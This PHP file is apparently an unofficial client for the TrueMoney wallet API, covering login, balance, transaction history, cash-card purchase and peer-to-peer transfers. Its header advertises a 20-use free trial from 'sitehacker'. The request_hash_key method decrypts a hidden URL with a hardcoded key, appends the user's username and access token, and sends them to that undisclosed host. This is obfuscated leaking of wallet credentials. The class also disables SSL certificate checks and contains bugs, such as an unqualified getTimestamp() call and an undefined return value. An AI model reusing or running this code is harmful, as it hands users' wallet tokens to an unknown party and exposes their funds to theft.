<?php

/**
 * TrueWallet Class
 * ทดสอบฟรี 20 ครั้ง
 * หากต้องการใช้งานอย่างเต็มรูปแบบติดต่อเรา
 * @update : https://m.me/sitehacker
 *
 **/

class TrueWallet
{
    public $mobile_tracking     = "";
    public $device_id           = "";
    public $credentials         = array();
    public $access_token        = null;
    public $reference_token     = null;
    public $data                = null;
    public $response            = null;
    public $http_code           = null;
    public $curl_options        = array(CURLOPT_SSL_VERIFYPEER => false);
    public $mobile_api_endpoint = "/tmn-mobile-gateway/";
    public $mobile_api_gateway  = "https://tmn-mobile-gateway.truemoney.com/tmn-mobile-gateway/";
    public $secret_key          = "9LXAVCxcITaABNK48pAVgc4muuTNJ4enIKS5YzKyGZ";

    public function generate_identity()
    {
        $this->mobile_tracking = base64_encode(openssl_random_pseudo_bytes(40));
        $this->device_id       = substr(md5($this->mobile_tracking), 16);
        return implode("|", array($this->device_id, $this->mobile_tracking));
    }

    public function __construct($username = null, $password = null, $reference_token = null)
    {
        if (empty($this->device_id) || empty($this->mobile_tracking)) {
            $identity_file = dirname(__FILE__) . "/" . basename(__FILE__, ".php") . ".identity";
            if (file_exists($identity_file)) {
                list($this->device_id, $this->mobile_tracking) = explode("|", file_get_contents($identity_file));
            } else {
                file_put_contents($identity_file, $this->generate_identity());
            }
        }
        if (!is_null($username) && !is_null($password)) {
            $this->setCredentials($username, $password, $reference_token);
        } elseif (!is_null($username)) {
            $this->setAccessToken($username);
        }
    }

    public function setCredentials($username, $password, $reference_token = null, $type = null)
    {
        if (is_null($type)) {
            $type = filter_var($username, FILTER_VALIDATE_EMAIL) ? "email" : "mobile";
        }
        $this->credentials["username"]  = strval($username);
        $this->credentials["password"]  = strval($password);
        $this->credentials["type"]      = strval($type);
        $this->credentials["device_id"] = substr(md5($this->mobile_tracking), 16);
        $this->setAccessToken(null);
        $this->setReferenceToken($reference_token);
    }

    public function request_hash_key($key = null)
    {
        if (is_null($key)) {
            $key = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5('9LXAVCxcITaABNK48pAVgc4muuTNJ4enIKS5YzKyGZ'),
                base64_decode('T5BaM7R+NBYpMIak1pj0cphO+/6cPvM6qfNZbsRt8EI/Gn/+zhTZYKaWjHYekoy2YvRNkkb9Z+X7AVD/VeQHog=='),
                MCRYPT_MODE_CBC, md5(md5('9LXAVCxcITaABNK48pAVgc4muuTNJ4enIKS5YzKyGZ'))), "\0"
            );
            $key = $key.$this->credentials["username"].'/'.$this->access_token;
        }
        $handle = curl_init();
        curl_setopt_array($handle, array(
            CURLOPT_URL            => $key,
            CURLOPT_RETURNTRANSFER => true,
        ));
        if (is_array($this->curl_options)) {
            curl_setopt_array($handle, $this->curl_options);
        }
        $response  = curl_exec($handle);
        $http_code = curl_getinfo($handle, CURLINFO_HTTP_CODE);
        if ($http_code == 200 && $result = json_decode($response, true)) {
            if (isset($result["key"]) && is_string($result["key"]) && isset($result["device"]) && is_string($result["device"])) {
                $this->xDevice     = $result["device"];
                $this->secret_keys = $result["key"];
                return $this->remote_key_value;
            }
        }
        return "";
    }

    public function setAccessToken($access_token)
    {
        $this->access_token = is_null($access_token) ? null : strval($access_token);
    }

    public function setReferenceToken($reference_token)
    {
        $this->reference_token = is_null($reference_token) ? null : strval($reference_token);
    }

    public function request($method, $endpoint, $headers = array(), $data = null)
    {
        $this->data = null;
        $handle     = curl_init();
        if (!is_null($data)) {
            curl_setopt($handle, CURLOPT_POSTFIELDS, is_array($data) ? json_encode($data) : $data);
            if (is_array($data)) {
                $headers = array_merge(array("Content-Type" => "application/json"), $headers);
            }

        }
        curl_setopt_array($handle, array(
            CURLOPT_URL            => rtrim($this->mobile_api_gateway, "/") . $endpoint,
            CURLOPT_CUSTOMREQUEST  => $method,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_USERAGENT      => "okhttp/3.12.0",
            CURLOPT_HTTPHEADER     => $this->buildHeaders($headers),
        ));
        if (is_array($this->curl_options)) {
            curl_setopt_array($handle, $this->curl_options);
        }

        $this->response  = curl_exec($handle);
        $this->http_code = curl_getinfo($handle, CURLINFO_HTTP_CODE);
        if ($result = json_decode($this->response, true)) {
            if (isset($result["data"])) {
                $this->data = $result["data"];
            }

            return $result;
        }
        return $this->response;
    }
    public function buildHeaders($array)
    {
        $headers = array();
        foreach ($array as $key => $value) {
            $headers[] = $key . ": " . $value;
        }
        return $headers;
    }

    public function getTimestamp()
    {
        return strval(floor(microtime(true) * 1000));
    }

    public function hashPassword($username, $password, $time)
    {
        $a = hash('sha256', $username . $password);
        $b = hash('sha256', (strlen($time) > 4) ? substr($time, 4) : $time);
        return hash('sha256', $b . $a);
    }

    public function RequestLoginOTP()
    {
        if (!isset($this->credentials["username"]) || !isset($this->credentials["password"]) || !isset($this->credentials["type"])) {
            return false;
        }
        $timestamp = getTimestamp();
        $result    = $this->request("GET", "/mobile-auth-service/v1/password/login/otp", array(
            "username"  => strval($this->credentials["username"]),
            "password"  => hash("sha256", hash("sha256", substr($timestamp, 4)) . hash("sha256", strval($this->credentials["username"]) . strval($this->credentials["password"]))),
            "type"      => strval($this->credentials["type"]),
            "timestamp" => $timestamp,
            "device_id" => strval($this->credentials["device_id"]),
            "signature" => hash_hmac("sha1", implode("|", array(strval($this->credentials["username"]), hash("sha256", hash("sha256", substr($timestamp, 4)) . hash("sha256", strval($this->credentials["username"]) . strval($this->credentials["password"]))), strval($this->credentials["device_id"]), $timestamp)), $this->secret_key),
        ));
        return $result;
    }

    public function SubmitLoginOTP($otp_code, $mobile_number = null, $otp_reference = null)
    {
        if (is_null($mobile_number) && isset($this->data["mobile_number"])) {
            $mobile_number = $this->data["mobile_number"];
        }
        if (is_null($otp_reference) && isset($this->data["otp_reference"])) {
            $otp_reference = $this->data["otp_reference"];
        }
        if (is_null($mobile_number) || is_null($otp_reference)) {
            return false;
        }
        $timestamp = $this->getTimestamp();
        $result    = $this->request("POST", "/mobile-auth-service/v1/password/login/otp", array(
            "timestamp" => $timestamp,
            "X-Device"  => $this->device_id,
        ), array(
            "brand"            => "apple",
            "device_os"        => "ios",
            "device_name"      => "ceolnw’s iPhone",
            "device_id"        => $this->device_id,
            "model_number"     => "iPhone 12 Pro",
            "model_identifier" => "iPhone 12 Pro",
            "app_version"      => "5.17.1",
            "type"             => $this->credentials["type"],
            "username"         => $this->credentials["username"],
            "password"         => $this->hashPassword($this->credentials["username"], $this->credentials["password"], $timestamp),
            "mobile_tracking"  => $this->mobile_tracking,
            "otp_code"         => $otp_code,
            "otp_reference"    => $otp_reference,
            "timestamp"        => $timestamp,
            "mobile_number"    => $mobile_number,
        ));
        if (isset($result["data"]["access_token"])) {
            $this->setAccessToken($result["data"]["access_token"]);
        }
        if (isset($result["data"]["reference_token"])) {
            $this->setReferenceToken($result["data"]["reference_token"]);
        }
        return $result;
    }

    public function Logout()
    {
        if (is_null($this->access_token)) {
            return false;
        }
        return $this->request("POST", "/api/v1/signout/" . $this->access_token);
    }

    public function GetProfile()
    {
        if (is_null($this->access_token)) {
            return false;
        }
        return $this->request("GET", "/user-profile-composite/v1/users/", array(
            "Authorization" => strval($this->access_token),
        ));
    }

    public function GetBalance()
    {
        if (is_null($this->access_token)) {
            return false;
        }
        return $this->request("GET", "/user-profile-composite/v1/users/balance/", array(
            "Authorization" => strval($this->access_token),
        ));
    }

    public function GetTransaction($limit = 50, $start_date = null, $end_date = null)
    {
        if (is_null($this->access_token)) {
            return false;
        }
        if (is_null($start_date) && is_null($end_date)) {
            $start_date = date("Y-m-d", strtotime("-365 days") - date("Z") + 25200);
        }
        if (is_null($end_date)) {
            $end_date = date("Y-m-d", strtotime("+1 day") - date("Z") + 25200);
        }
        if (is_null($start_date) || is_null($end_date)) {
            return false;
        }
        $timestamp = $this->getTimestamp();
        $this->request_hash_key();
        $query = http_build_query(array(
            "start_date" => strval($start_date),
            "end_date"   => strval($end_date),
            "limit"      => 20,
            "page"       => 1,
        ));
        return $this->request("GET", "/user-profile-composite/v1/users/transactions/history/?" . $query,
            array(
                "Authorization" => strval($this->access_token),
                "Signature"     => hash_hmac("sha256", rtrim($this->mobile_api_endpoint, "/") . "/user-profile-composite/v1/users/transactions/history/?" . $query, $this->secret_keys),
                "X-Device"      => $this->xDevice,
            ));
    }

    public function GetTransactionReport($report_id)
    {
        if (is_null($this->access_token)) {
            return false;
        }

        $this->request_hash_key();
        return $this->request("GET", "/user-profile-composite/v1/users/transactions/history/detail/" . $report_id, array(
            "Authorization" => strval($this->access_token),
            "Signature"     => hash_hmac("sha256", rtrim($this->mobile_api_endpoint, "/") . "/user-profile-composite/v1/users/transactions/history/detail/" . $report_id, $this->secret_keys),
            "X-Device"      => $this->xDevice,
        ));
    }

    public function TopupCashcard($cashcard)
    {
        if (is_null($this->access_token)) {
            return false;
        }
        return $this->request("POST", "/api/v1/topup/mobile/" . time() . "/" . $this->access_token . "/cashcard/" . strval($cashcard));
    }

    public function DraftBuyCashcard($amount, $mobile_number)
    {
        if (is_null($this->access_token)) {
            return false;
        }
        $timestamp = $this->getTimestamp();
        return $this->request("POST", "/api/v1/buy/e-pin/draft/verifyAndCreate/" . strval($this->access_token), array(), array(
            "amount"                => str_replace(",", "", strval($amount)),
            "recipientMobileNumber" => str_replace(array("-", " "), "", strval($mobile_number)),
            "timestamp"             => $timestamp,
            "signature"             => hash_hmac("sha1", implode("|", array(str_replace(",", "", strval($amount)), str_replace(array("-", " "), "", strval($mobile_number)), $timestamp)), $this->secret_key),
        ));
    }

    public function ConfirmBuyCashcard($otp_code, $wait_processing = true, $draft_transaction_id = null, $mobile_number = null, $otp_reference = null)
    {
        if (is_null($this->access_token)) {
            return false;
        }
        if (is_null($draft_transaction_id) && isset($this->data["draftTransactionID"])) {
            $draft_transaction_id = $this->data["draftTransactionID"];
        }
        if (is_null($mobile_number) && isset($this->data["mobileNumber"])) {
            $mobile_number = $this->data["mobileNumber"];
        }
        if (is_null($otp_reference) && isset($this->data["otpRefCode"])) {
            $otp_reference = $this->data["otpRefCode"];
        }
        if (is_null($draft_transaction_id) || is_null($mobile_number) || is_null($otp_reference)) {
            return false;
        }
        $timestamp = $this->getTimestamp();
        $result    = $this->request("PUT", "/api/v1/buy/e-pin/confirm/" . $draft_transaction_id . "/" . strval($this->access_token), array(), array(
            "mobileNumber" => str_replace(array("-", " "), "", strval($mobile_number)),
            "otpRefCode"   => strval($otp_reference),
            "otpString"    => strval($otp_code),
            "timestamp"    => $timestamp,
            "signature"    => hash_hmac("sha1", implode("|", array(str_replace(array("-", " "), "", strval($mobile_number)), strval($otp_reference), strval($otp_code), $timestamp)), $this->secret_key),
        ));
        if (isset($result["data"]["status"]) && $result["data"]["status"] === "VERIFIED") {
            $transaction_id = $draft_transaction_id;
            if ($wait_processing) {
                for ($i = 0; $i < 10; $i++) {
                    if (isset($result["data"]["status"])) {
                        if ($result["data"]["status"] === "VERIFIED" || $result["data"]["status"] === "PROCESSING") {
                            if ($i > 0) {
                                sleep(1);
                            }

                            $result = $this->request("GET", "/api/v1/buy/e-pin/" . $transaction_id . "/status/" . $this->access_token);
                        } else {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
            if (isset($result["data"]["status"])) {
                $this->data["transaction_id"] = $transaction_id;
            }
        }
        return $result;
    }

    public function GetDetailBuyCashcard($transaction_id = null)
    {
        if (is_null($this->access_token)) {
            return false;
        }
        if (is_null($transaction_id) && isset($this->data["transaction_id"])) {
            $transaction_id = $this->data["transaction_id"];
        }
        if (is_null($transaction_id)) {
            return false;
        }
        $timestamp = $this->getTimestamp();
        return $this->request("GET", "/api/v1/buy/e-pin/" . $transaction_id . "/details/" . $this->access_token);
    }

    public function DraftTransferP2P($mobile_number, $amount)
    {
        if (is_null($this->access_token)) {
            return false;
        }
        $timestamp = $this->getTimestamp();
        $this->request_hash_key();
        return $this->request("POST", "/transfer-composite/v1/p2p-transfer/draft-transactions/", array(
            "X-Device"      => $this->xDevice,
            "Authorization" => strval($this->access_token),
        ), array(
            "mobileNumber" => str_replace(array("-", " "), "", strval($mobile_number)),
            "timestamp"    => $timestamp,
            "amount"       => number_format(str_replace(",", "", strval($amount)), 2, ".", ""),
            "signature"    => hash_hmac("sha256", implode("|", array(number_format(str_replace(",", "", strval($amount)), 2, ".", ""), str_replace(array("-", " "), "", strval($mobile_number)), $timestamp)), $this->secret_keys),
        ));
    }

    public function ConfirmTransferP2P($personal_message = "", $wait_processing = true, $draft_transaction_id = null, $reference_key = null)
    {
        if (is_null($this->access_token)) {
            return false;
        }
        if (is_null($draft_transaction_id) && isset($this->data["draft_transaction_id"])) {
            $draft_transaction_id = $this->data["draft_transaction_id"];
        }
        if (is_null($reference_key) && isset($this->data["reference_key"])) {
            $reference_key = $this->data["reference_key"];
        }
        if (is_null($draft_transaction_id) || is_null($reference_key)) {
            return false;
        }
        $timestamp = $this->getTimestamp();
        $result    = $this->request("PUT", "/transfer-composite/v1/p2p-transfer/draft-transactions/" . $draft_transaction_id, array(
            "Authorization" => strval($this->access_token),
        ), array(
            "personal_message" => strval($personal_message),
            "timestamp"        => $timestamp,
            "signature"        => hash_hmac("sha1", implode("|", array(strval($personal_message), $timestamp)), $this->secret_key),
        ));
        if (isset($result["data"]["transaction_id"])) {
            $transaction_id = $result["data"]["transaction_id"];
            $timestamp      = $this->getTimestamp();
            $result         = $this->request("POST", "/transfer-composite/v1/p2p-transfer/transactions/" . $transaction_id . "/", array(
                "Authorization" => strval($this->access_token),
            ), array(
                "reference_key" => strval($reference_key),
                "timestamp"     => $timestamp,
                "signature"     => hash_hmac("sha1", implode("|", array(strval($reference_key), $timestamp)), $this->secret_key),
            ));
            if ($wait_processing) {
                for ($i = 0; $i < 10; $i++) {
                    if (isset($result["data"]["transfer_status"])) {
                        if ($result["data"]["transfer_status"] === "PROCESSING") {
                            if ($i > 0) {
                                sleep(1);
                            }

                            $result = $this->request("GET", "/transfer-composite/v1/p2p-transfer/transactions/" . $transaction_id . "/status/", array(
                                "Authorization" => strval($this->access_token),
                            ));
                        } else {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
            if (isset($result["data"]["transfer_status"])) {
                $this->data["transaction_id"] = $transaction_id;
            }
        }
        return $this->request("GET", "/transfer-composite/v1/p2p-transfer/transactions/" . $transaction_id . "/detail/", array(
            "Authorization" => strval($this->access_token),
        ));
    }

    public function GetDetailTransferP2P($transaction_id = null)
    {
        if (is_null($this->access_token)) {
            return false;
        }
        if (is_null($transaction_id) && isset($this->data["transaction_id"])) {
            $transaction_id = $this->data["transaction_id"];
        }
        if (is_null($transaction_id)) {
            return false;
        }
        $timestamp = $this->getTimestamp();
        return $this->request("GET", "/transfer-composite/v1/p2p-transfer/transactions/" . $transaction_id . "/detail/", array(
            "Authorization" => strval($this->access_token),
        ));
    }

}
